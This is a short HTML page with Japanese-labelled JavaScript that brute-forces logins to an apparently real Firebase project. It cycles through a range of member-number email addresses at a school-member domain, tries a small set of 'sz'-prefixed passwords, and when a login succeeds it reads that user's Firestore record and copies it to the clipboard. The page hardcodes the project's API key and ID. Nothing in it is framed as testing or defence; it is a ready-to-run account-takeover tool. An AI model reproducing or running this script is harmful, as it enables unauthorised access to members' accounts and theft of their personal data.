<script type="module">
const { initializeApp, getApps } = await import("https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js");
const { getAuth, signInWithEmailAndPassword } = await import("https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js");
const { getFirestore, doc, getDoc } = await import("https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js");

const firebaseConfig = {
  apiKey: "AIzaSyAuSr-KgBjfvp-yroLH2X0tujZaUenFVsY",
  authDomain: "boxwood-spot-486909-j1.firebaseapp.com",
  projectId: "boxwood-spot-486909-j1",
};

const app = getApps().length
  ? getApps()[0]
  : initializeApp(firebaseConfig);

const auth = getAuth(app);
const db = getFirestore(app);

// ==============================
// 設定
// ==============================

// 会員番号範囲
const MEMBER_START = 12137741;
const MEMBER_END   = 12138888;

// パスワード設定
const PASS_PREFIX = "sz";
const PASS_START  = 111111;
const PASS_END    = 111114;

// 停止フラグ
let running = true;

// ==============================
// ログ表示
// ==============================

function log(...args) {
  console.log(...args);

  const box = document.getElementById("log");

  if (box) {
    box.value += args.join(" ") + "\n";
    box.scrollTop = box.scrollHeight;
  }
}

// ==============================
// メイン処理
// ==============================

async function run() {

  for (let m = MEMBER_START; m <= MEMBER_END; m++) {

    if (!running) {
      log("停止");
      return;
    }

    const member = String(m).padStart(8, "0");
    const email = `${member}@your-school-member.com`;

    for (let p = PASS_START; p <= PASS_END; p++) {

      if (!running) {
        log("停止");
        return;
      }

      const password = `${PASS_PREFIX}${p}`;

      log(`試行 ${email} / ${password}`);

      try {

        // ログイン
        const cred = await signInWithEmailAndPassword(
          auth,
          email,
          password
        );

        const uid = cred.user.uid;

        log("ログイン成功");

        // Firestore取得
        const memberId = localStorage.getItem("memberId") || uid;

        const snap = await getDoc(
          doc(db, "users", memberId)
        );

        if (snap.exists()) {

          const data = snap.data();

          log("=== JSON取得成功 ===");

          const jsonText = JSON.stringify(data, null, 2);

          console.log(jsonText);

          // テキスト表示
          const result = document.getElementById("result");

          if (result) {
            result.value = jsonText;
          }

          // クリップボード
          await navigator.clipboard.writeText(jsonText);

          log("クリップボードへコピー");

          running = false;
          return;

        } else {

          log("ドキュメントなし");

        }

      } catch (e) {

        log("失敗:", e.message);

      }

    }

  }

  log("終了");
}

// ==============================
// UI
// ==============================

window.startSearch = () => {
  running = true;
  run();
};

window.stopSearch = () => {
  running = false;
};
</script>

<div style="padding:20px;font-family:sans-serif">

  <button onclick="startSearch()">
    開始
  </button>

  <button onclick="stopSearch()">
    停止
  </button>

  <h3>ログ</h3>

  <textarea
    id="log"
    style="width:100%;height:250px"
  ></textarea>

  <h3>結果</h3>

  <textarea
    id="result"
    style="width:100%;height:250px"
  ></textarea>

</div>
